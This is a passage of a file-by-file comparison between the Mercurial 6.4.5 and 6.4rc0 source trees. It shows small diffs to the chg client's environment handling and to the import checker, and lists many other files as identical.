 #define PATH_MAX 4096
 #endif
 
-extern char **environ;
-
 struct cmdserveropts {
 	char sockname[PATH_MAX];
 	char initsockname[PATH_MAX];
 	char redirectsockname[PATH_MAX];
 	size_t argsize;
 	const char **args;
 };
@@ -236,14 +234,15 @@
 	}
 	return hgcmd;
 }
 
 static void execcmdserver(const struct cmdserveropts *opts)
 {
 	const char *hgcmd = gethgcmd();
+
 	const char *baseargv[] = {
 	    hgcmd,     "serve",     "--no-profile",     "--cmdserver",
 	    "chgunix", "--address", opts->initsockname, "--daemon-postexec",
 	    "chdir:/",
 	};
 	size_t baseargvsize = sizeof(baseargv) / sizeof(baseargv[0]);
 	size_t argsize = baseargvsize + opts->argsize + 1;
@@ -481,15 +480,15 @@
 static void execoriginalhg(const char *argv[])
 {
 	debugmsg("execute original hg");
 	if (execvp(gethgcmd(), (char **)argv) < 0)
 		abortmsgerrno("failed to exec original hg");
 }
 
-int main(int argc, const char *argv[])
+int main(int argc, const char *argv[], const char *envp[])
 {
 	if (getenv("CHGDEBUG"))
 		enabledebugmsg();
 
 	if (!getenv("HGPLAIN") && isatty(fileno(stderr)))
 		enablecolor();
 
@@ -510,34 +509,21 @@
 	if (argc == 2) {
 		if (strcmp(argv[1], "--kill-chg-daemon") == 0) {
 			killcmdserver(&opts);
 			return 0;
 		}
 	}
 
-	/* Set $CHGHG to the path of the hg executable we intend to use. This
-	 * is a no-op if $CHGHG was expliclty specified, but otherwise this
-	 * ensures that we will spawn a new command server if we connect to an
-	 * existing one running from a different executable. This should only
-	 * only be needed when chg is built with HGPATHREL since otherwise the
-	 * hg executable used when CHGHG is absent should be deterministic.
-	 * */
-	if (setenv("CHGHG", gethgcmd(), 1) != 0)
-		abortmsgerrno("failed to setenv");
-
 	hgclient_t *hgc;
 	size_t retry = 0;
 	while (1) {
 		hgc = connectcmdserver(&opts);
 		if (!hgc)
 			abortmsg("cannot open hg client");
-		/* Use `environ(7)` instead of the optional `envp` argument to
-		 * `main` because `envp` does not update when the environment
-		 * changes, but `environ` does. */
-		hgc_setenv(hgc, (const char *const *)environ);
+		hgc_setenv(hgc, envp);
 		const char **insts = hgc_validate(hgc, argv + 1, argc - 1);
 		int needreconnect = runinstructions(&opts, insts);
 		free(insts);
 		if (!needreconnect)
 			break;
 		hgc_close(hgc);
 		if (++retry > 10)
```

### Comparing `mercurial-6.4.5/contrib/chg/hgclient.c` & `mercurial-6.4rc0/contrib/chg/hgclient.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/hgclient.h` & `mercurial-6.4rc0/contrib/chg/hgclient.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/procutil.c` & `mercurial-6.4rc0/contrib/chg/procutil.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/procutil.h` & `mercurial-6.4rc0/contrib/chg/procutil.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/util.c` & `mercurial-6.4rc0/contrib/chg/util.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/chg/util.h` & `mercurial-6.4rc0/contrib/chg/util.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/debugcmdserver.py` & `mercurial-6.4rc0/contrib/debugcmdserver.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/debugshell.py` & `mercurial-6.4rc0/contrib/debugshell.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/docker/apache-server/Dockerfile` & `mercurial-6.4rc0/contrib/docker/apache-server/Dockerfile`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/docker/apache-server/README.rst` & `mercurial-6.4rc0/contrib/docker/apache-server/README.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/docker/apache-server/entrypoint.sh` & `mercurial-6.4rc0/contrib/docker/apache-server/entrypoint.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/docker/apache-server/vhost.conf` & `mercurial-6.4rc0/contrib/docker/apache-server/vhost.conf`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/dumprevlog` & `mercurial-6.4rc0/contrib/dumprevlog`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/editmerge` & `mercurial-6.4rc0/contrib/editmerge`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/editmergeps.ps1` & `mercurial-6.4rc0/contrib/editmergeps.ps1`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/FuzzedDataProvider.h` & `mercurial-6.4rc0/contrib/fuzz/FuzzedDataProvider.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/Makefile` & `mercurial-6.4rc0/contrib/fuzz/Makefile`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/README.rst` & `mercurial-6.4rc0/contrib/fuzz/README.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/bdiff.cc` & `mercurial-6.4rc0/contrib/fuzz/bdiff.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/dirs.cc` & `mercurial-6.4rc0/contrib/fuzz/dirs.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/dirs_corpus.py` & `mercurial-6.4rc0/contrib/fuzz/dirs_corpus.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/dirstate.cc` & `mercurial-6.4rc0/contrib/fuzz/dirstate.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/fm1readmarkers.cc` & `mercurial-6.4rc0/contrib/fuzz/fm1readmarkers.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/fm1readmarkers_corpus.py` & `mercurial-6.4rc0/contrib/fuzz/fm1readmarkers_corpus.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/fncache.cc` & `mercurial-6.4rc0/contrib/fuzz/fncache.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/fuzzutil.h` & `mercurial-6.4rc0/contrib/fuzz/fuzzutil.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/jsonescapeu8fast.cc` & `mercurial-6.4rc0/contrib/fuzz/jsonescapeu8fast.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/manifest.cc` & `mercurial-6.4rc0/contrib/fuzz/manifest.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/manifest_corpus.py` & `mercurial-6.4rc0/contrib/fuzz/manifest_corpus.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/mpatch.cc` & `mercurial-6.4rc0/contrib/fuzz/mpatch.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/mpatch_corpus.py` & `mercurial-6.4rc0/contrib/fuzz/mpatch_corpus.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/pyutil.cc` & `mercurial-6.4rc0/contrib/fuzz/pyutil.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/revlog.cc` & `mercurial-6.4rc0/contrib/fuzz/revlog.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/revlog_corpus.py` & `mercurial-6.4rc0/contrib/fuzz/revlog_corpus.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/standalone_fuzz_target_runner.cc` & `mercurial-6.4rc0/contrib/fuzz/standalone_fuzz_target_runner.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/fuzz/xdiff.cc` & `mercurial-6.4rc0/contrib/fuzz/xdiff.cc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/genosxversion.py` & `mercurial-6.4rc0/contrib/genosxversion.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/heptapod-ci.yml` & `mercurial-6.4rc0/contrib/heptapod-ci.yml`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/hg-ssh` & `mercurial-6.4rc0/contrib/hg-ssh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/hg-test-mode.el` & `mercurial-6.4rc0/contrib/hg-test-mode.el`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/hgclient.py` & `mercurial-6.4rc0/contrib/hgclient.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/hgk` & `mercurial-6.4rc0/contrib/hgk`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/hgperf` & `mercurial-6.4rc0/contrib/hgperf`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/hgsh/hgsh.c` & `mercurial-6.4rc0/contrib/hgsh/hgsh.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/hgweb.fcgi` & `mercurial-6.4rc0/contrib/hgweb.fcgi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/hgweb.wsgi` & `mercurial-6.4rc0/contrib/hgweb.wsgi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/import-checker.py` & `mercurial-6.4rc0/contrib/import-checker.py`

 * *Files 0% similar despite different names*

```diff
@@ -228,15 +228,14 @@
     for m in ['msvcrt', '_winreg']:
         yield m
     yield '__builtin__'
     yield 'builtins'  # python3 only
     yield 'importlib.abc'  # python3 only
     yield 'importlib.machinery'  # python3 only
     yield 'importlib.util'  # python3 only
-    yield 'packaging.version'
     for m in 'fcntl', 'grp', 'pwd', 'termios':  # Unix only
         yield m
     for m in 'cPickle', 'datetime':  # in Python (not C) on PyPy
         yield m
     for m in ['cffi']:
         yield m
     stdlib_prefixes = {sys.prefix, sys.exec_prefix}
```

### Comparing `mercurial-6.4.5/contrib/install-windows-dependencies.ps1` & `mercurial-6.4rc0/contrib/install-windows-dependencies.ps1`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/logo-droplets.svg` & `mercurial-6.4rc0/contrib/logo-droplets.svg`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/memory.py` & `mercurial-6.4rc0/contrib/memory.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/mercurial.el` & `mercurial-6.4rc0/contrib/mercurial.el`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/merge-lists/Cargo.lock` & `mercurial-6.4rc0/contrib/merge-lists/Cargo.lock`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/merge-lists/Cargo.toml` & `mercurial-6.4rc0/contrib/merge-lists/Cargo.toml`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/merge-lists/src/main.rs` & `mercurial-6.4rc0/contrib/merge-lists/src/main.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/merge-lists/tests/test-merge-lists.rs` & `mercurial-6.4rc0/contrib/merge-lists/tests/test-merge-lists.rs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/mq.el` & `mercurial-6.4rc0/contrib/mq.el`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/Makefile` & `mercurial-6.4rc0/contrib/packaging/Makefile`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/build-linux-wheels.sh` & `mercurial-6.4rc0/contrib/packaging/build-linux-wheels.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/builddeb` & `mercurial-6.4rc0/contrib/packaging/builddeb`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/buildrpm` & `mercurial-6.4rc0/contrib/packaging/buildrpm`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/debian/control` & `mercurial-6.4rc0/contrib/packaging/debian/control`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/debian/copyright` & `mercurial-6.4rc0/contrib/packaging/debian/copyright`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/debian/rules` & `mercurial-6.4rc0/contrib/packaging/debian/rules`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/docker/rhel9` & `mercurial-6.4rc0/contrib/packaging/docker/rhel9`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/dockerdeb` & `mercurial-6.4rc0/contrib/packaging/dockerdeb`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/dockerrpm` & `mercurial-6.4rc0/contrib/packaging/dockerrpm`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/hg-docker` & `mercurial-6.4rc0/contrib/packaging/hg-docker`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/hgpackaging/cli.py` & `mercurial-6.4rc0/contrib/packaging/hgpackaging/cli.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/hgpackaging/downloads.py` & `mercurial-6.4rc0/contrib/packaging/hgpackaging/downloads.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/hgpackaging/inno.py` & `mercurial-6.4rc0/contrib/packaging/hgpackaging/inno.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/hgpackaging/pyoxidizer.py` & `mercurial-6.4rc0/contrib/packaging/hgpackaging/pyoxidizer.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/hgpackaging/util.py` & `mercurial-6.4rc0/contrib/packaging/hgpackaging/util.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/hgpackaging/wix.py` & `mercurial-6.4rc0/contrib/packaging/hgpackaging/wix.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/inno/mercurial.iss` & `mercurial-6.4rc0/contrib/packaging/inno/mercurial.iss`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/inno/modpath.iss` & `mercurial-6.4rc0/contrib/packaging/inno/modpath.iss`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/inno/readme.rst` & `mercurial-6.4rc0/contrib/packaging/inno/readme.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/macosx/Readme.html` & `mercurial-6.4rc0/contrib/packaging/macosx/Readme.html`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/macosx/Welcome.html` & `mercurial-6.4rc0/contrib/packaging/macosx/Welcome.html`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/macosx/distribution.xml` & `mercurial-6.4rc0/contrib/packaging/macosx/distribution.xml`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/mercurial.spec` & `mercurial-6.4rc0/contrib/packaging/mercurial.spec`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/packagelib.sh` & `mercurial-6.4rc0/contrib/packaging/packagelib.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/packaging.py` & `mercurial-6.4rc0/contrib/packaging/packaging.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/requirements-macos.txt` & `mercurial-6.4rc0/contrib/packaging/requirements-macos.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/requirements-macos.txt.in` & `mercurial-6.4rc0/contrib/packaging/requirements-macos.txt.in`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/requirements-windows-py3.txt` & `mercurial-6.4rc0/contrib/packaging/requirements-windows-py3.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/requirements.txt` & `mercurial-6.4rc0/contrib/packaging/requirements.txt`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/wix/COPYING.rtf` & `mercurial-6.4rc0/contrib/packaging/wix/COPYING.rtf`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/wix/guids.wxi` & `mercurial-6.4rc0/contrib/packaging/wix/guids.wxi`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/wix/mercurial.wxs` & `mercurial-6.4rc0/contrib/packaging/wix/mercurial.wxs`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/packaging/wix/readme.rst` & `mercurial-6.4rc0/contrib/packaging/wix/readme.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/perf-utils/compare-discovery-case` & `mercurial-6.4rc0/contrib/perf-utils/compare-discovery-case`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/perf-utils/discovery-helper.sh` & `mercurial-6.4rc0/contrib/perf-utils/discovery-helper.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/perf-utils/perf-revlog-write-plot.py` & `mercurial-6.4rc0/contrib/perf-utils/perf-revlog-write-plot.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/perf-utils/search-discovery-case` & `mercurial-6.4rc0/contrib/perf-utils/search-discovery-case`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/perf-utils/subsetmaker.py` & `mercurial-6.4rc0/contrib/perf-utils/subsetmaker.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/perf.py` & `mercurial-6.4rc0/contrib/perf.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/phab-clean.py` & `mercurial-6.4rc0/contrib/phab-clean.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/phab-refresh-stack.sh` & `mercurial-6.4rc0/contrib/phab-refresh-stack.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/plan9/9diff` & `mercurial-6.4rc0/contrib/plan9/9diff`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/plan9/README` & `mercurial-6.4rc0/contrib/plan9/README`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/plan9/mkfile` & `mercurial-6.4rc0/contrib/plan9/mkfile`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/pull_logger.py` & `mercurial-6.4rc0/contrib/pull_logger.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/pylintrc` & `mercurial-6.4rc0/contrib/pylintrc`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-hook-examples.py` & `mercurial-6.4rc0/contrib/python-hook-examples.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/LICENSE` & `mercurial-6.4rc0/contrib/python-zstandard/LICENSE`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/NEWS.rst` & `mercurial-6.4rc0/contrib/python-zstandard/NEWS.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/README.rst` & `mercurial-6.4rc0/contrib/python-zstandard/README.rst`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/bufferutil.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/bufferutil.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/compressionchunker.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressionchunker.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/compressiondict.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressiondict.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/compressionparams.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressionparams.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/compressionreader.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressionreader.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/compressionwriter.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressionwriter.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/compressobj.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressobj.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/compressor.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressor.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/compressoriterator.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/compressoriterator.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/constants.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/constants.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressionreader.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressionreader.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressionwriter.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressionwriter.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressobj.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressobj.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressor.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressor.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/decompressoriterator.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/decompressoriterator.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/frameparams.c` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/frameparams.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/c-ext/python-zstandard.h` & `mercurial-6.4rc0/contrib/python-zstandard/c-ext/python-zstandard.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/make_cffi.py` & `mercurial-6.4rc0/contrib/python-zstandard/make_cffi.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/setup.py` & `mercurial-6.4rc0/contrib/python-zstandard/setup.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/setup_zstd.py` & `mercurial-6.4rc0/contrib/python-zstandard/setup_zstd.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/common.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/common.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_buffer_util.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_buffer_util.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_compressor.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_compressor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_compressor_fuzzing.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_compressor_fuzzing.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_data_structures.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_data_structures.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_data_structures_fuzzing.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_data_structures_fuzzing.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_decompressor.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_decompressor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_decompressor_fuzzing.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_decompressor_fuzzing.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_module_attributes.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_module_attributes.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/tests/test_train_dictionary.py` & `mercurial-6.4rc0/contrib/python-zstandard/tests/test_train_dictionary.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstandard/__init__.py` & `mercurial-6.4rc0/contrib/python-zstandard/zstandard/__init__.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstandard/cffi.py` & `mercurial-6.4rc0/contrib/python-zstandard/zstandard/cffi.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/COPYING` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/COPYING`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/LICENSE` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/LICENSE`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/bitstream.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/bitstream.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/compiler.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/compiler.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/cpu.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/cpu.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/debug.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/debug.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/debug.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/debug.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/entropy_common.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/entropy_common.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/error_private.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/error_private.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/error_private.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/error_private.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/fse.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/fse.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/fse_decompress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/fse_decompress.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/huf.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/huf.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/mem.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/mem.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/pool.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/pool.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/pool.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/pool.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/pythoncapi_compat.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/pythoncapi_compat.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/threading.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/threading.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/threading.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/threading.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/xxhash.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/xxhash.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/xxhash.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/xxhash.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/zstd_common.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/zstd_common.c`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/zstd_errors.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/zstd_errors.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/common/zstd_internal.h` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/common/zstd_internal.h`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/contrib/python-zstandard/zstd/compress/fse_compress.c` & `mercurial-6.4rc0/contrib/python-zstandard/zstd/compress/fse_compress.c`

 * *Files identical despite different names*

